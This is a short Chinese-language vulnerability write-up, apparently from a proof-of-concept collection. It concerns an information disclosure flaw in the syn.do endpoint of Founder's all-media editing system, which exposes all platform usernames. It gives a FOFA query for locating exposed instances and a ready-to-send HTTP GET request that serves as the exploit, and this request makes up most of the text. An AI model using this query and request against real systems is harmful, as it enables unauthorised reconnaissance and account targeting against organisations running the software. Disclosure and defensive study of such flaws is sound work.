# 方正全媒体采编系统存在syn.do信息泄露漏洞

方正全媒体采编系统存在syn.do信息泄露漏洞，攻击者可以查看到平台中所有用户的用户名。

## fofa

```yaml
app="FOUNDER-全媒体采编系统"
```

## poc

```java
GET /newsedit/assess/syn.do?type=org HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Content-Length: 185Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```

![image-20240816100116204](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408161001270.png)